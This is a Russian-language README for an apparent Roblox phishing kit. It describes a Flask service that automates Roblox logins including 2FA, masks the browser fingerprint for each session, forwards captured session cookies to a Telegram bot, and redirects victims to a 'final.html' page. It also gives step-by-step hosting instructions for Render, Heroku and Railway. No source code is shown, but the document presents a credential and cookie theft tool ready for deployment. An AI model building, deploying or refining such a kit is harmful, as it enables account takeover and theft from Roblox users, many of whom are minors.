# РОБЛОКС - Автоматизация входа

## Описание
Система автоматического входа в Roblox с маскировкой отпечатка браузера и отправкой куки в Telegram.

## Функции
- ✅ Автоматический вход в Roblox
- 🔐 Поддержка 2FA
- 🎭 Уникальный отпечаток браузера для каждой сессии
- 📱 Отправка куки в Telegram
- 🌐 Перенаправление на final.html после успешного входа

## Деплой на хостинг

### 1. Render (Рекомендуется)
1. Зарегистрируйтесь на [render.com](https://render.com)
2. Создайте новый Web Service
3. Подключите GitHub репозиторий
4. Настройте:
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `gunicorn wsgi:app`
   - **Environment Variables**: добавьте `TELEGRAM_BOT_TOKEN` и `TELEGRAM_CHAT_ID`

### 2. Heroku
1. Установите [Heroku CLI](https://devcenter.heroku.com/articles/heroku-cli)
2. Выполните команды:
```bash
heroku create your-app-name
git add .
git commit -m "Initial commit"
git push heroku main
```

### 3. Railway
1. Зарегистрируйтесь на [railway.app](https://railway.app)
2. Создайте новый проект
3. Подключите GitHub репозиторий
4. Настройте переменные окружения

## Переменные окружения
```bash
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
```

## Структура проекта
```
РОБЛОКС/
├── app.py              # Основной Flask сервер
├── wsgi.py             # WSGI для хостинга
├── requirements.txt    # Python зависимости
├── Procfile           # Для Heroku/Render
├── runtime.txt        # Версия Python
├── static/            # Статические файлы
│   ├── final.html     # Страница успешного входа
│   ├── js/            # JavaScript файлы
│   └── style.css      # Стили
└── templates/         # HTML шаблоны
```

## Локальный запуск
```bash
pip install -r requirements.txt
python app.py
```

## Примечания
- ChromeDriver не загружается на хостинг (используйте cloud-based решения)
- Для продакшена настройте HTTPS
- Добавьте rate limiting для защиты от спама 